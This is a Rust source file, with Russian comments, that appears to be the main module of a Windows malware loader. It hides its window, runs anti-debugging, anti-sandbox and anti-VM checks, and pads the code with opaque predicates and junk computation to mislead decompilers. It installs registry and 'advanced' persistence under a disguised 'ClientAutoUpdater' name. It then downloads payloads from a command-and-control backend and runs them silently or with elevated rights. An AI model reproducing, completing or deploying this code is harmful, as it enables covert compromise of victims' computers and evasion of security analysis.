#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod anti_analysis;
mod anti_debug;
mod api_hash;
mod crypto;
mod downloader;
mod encrypted_container;
mod executor;
mod obfuscation;
mod persistence;
mod persistence_advanced;

// конфиг генерируется build.rs при компеляции
include!(concat!(env!("OUT_DIR"), "/generated_config.rs"));

use downloader::{fetch_metadata, download_file, RemoteFile};
use std::env;
use tokio;
use anyhow::Result;

// дебаг-лог — раскоментить если что-то сломалось, лог пишется в %TEMP%\dbg.txt
// fn dbg_log(msg: &str) {
//     use std::io::Write;
//     use std::time::{SystemTime, UNIX_EPOCH};
//     let ts = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
//     let path = std::env::temp_dir().join("dbg.txt");
//     if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(&path) {
//         let _ = writeln!(f, "[{}] {}", ts, msg);
//     }
// }

// (x^2 + x) всегда чётное, предикат всегда true — путаем декомпилятор
#[inline(never)]
fn opaque_check(x: u32) -> bool {
    (x.wrapping_mul(x).wrapping_add(x)) % 2 == 0
}

// мусорные вычисления, сбиваем статанализ
#[inline(never)]
fn junk_computation() -> u64 {
    let mut acc = 0u64;
    for i in 0..100 {
        acc = acc.wrapping_add(i).wrapping_mul(3);
    }
    acc
}

#[tokio::main]
async fn main() -> Result<()> {
    // ставим обработчик до всего остального
    unsafe {
        anti_debug::install_anti_debug_handler();
    }

    // мусор
    let _junk = junk_computation();

    // антидебаг, набрали >= 15 очков - уходим тихо
    let debug_score = anti_debug::run_anti_debug_checks();
    if debug_score >= 15 {
        // подозрительно, выходим
        std::process::exit(0);
    }

    // опак-предикат
    if !opaque_check(42) {
        // сюда никогда не попадём, декомпилятор запутаем
        std::process::exit(1);
    }

    // антианализ (VM/sandbox)
    let aa_config = anti_analysis::AntiAnalysisConfig::default();
    anti_analysis::enforce(&aa_config);

    // мусор
    let _junk2 = junk_computation();

    // конфиг: урл, секрет, профиль
    let config = get_config();
    let api_url = &config.api_url;
    let api_secret = &config.api_secret;
    let profile = &config.profile;

    // второй предикат, реальный путь
    if opaque_check(137) {
        // нормальный путь выполнения
    } else {
        std::process::exit(0);
    }

    // персистенс, имя декриптуем в рантайме
    if let Ok(exe_path) = env::current_exe() {
        let persist_name_enc: &[u8] = &[67u8, 108, 105, 101, 110, 116, 65, 117, 116, 111, 85, 112, 100, 97, 116, 101, 114];
        let persist_name: String = persist_name_enc.iter().map(|&b| b as char).collect();
        let _ = persistence::install_registry_persistence(&persist_name, exe_path.to_str().unwrap_or_default());
    }

    if let Ok(exe_path) = env::current_exe() {
        let exe_str = exe_path.to_str().unwrap_or_default();
        if let Err(_e) = persistence_advanced::install_advanced_persistence(exe_str) {
            // молча игнорируем
        }
    }

    // периодическая провека во время работы
    if anti_debug::check_timing_delta() || anti_debug::check_hardware_breakpoints() {
        std::process::exit(0);
    }

    // метадата с бэкенда
    let files_to_deploy: Vec<RemoteFile> = match fetch_metadata(api_url, api_secret, profile).await {
        Ok(files) => files,
        Err(_) => return Ok(()),
    };

    // качаем и запускаем
    for file_info in files_to_deploy {
        // провека перед каждым файлом
        if anti_debug::check_debugger_present() {
            std::process::exit(0);
        }

        match download_file(&file_info).await {
            Ok(saved_path) => {
                if file_info.run {
                    if file_info.elevated {
                        let _ = executor::execute_elevated(&saved_path);
                    } else {
                        let _ = executor::execute_silent(&saved_path);
                    }
                }
            },
            Err(_) => {
                // молча игнорируем
            }
        }
    }

    Ok(())
}
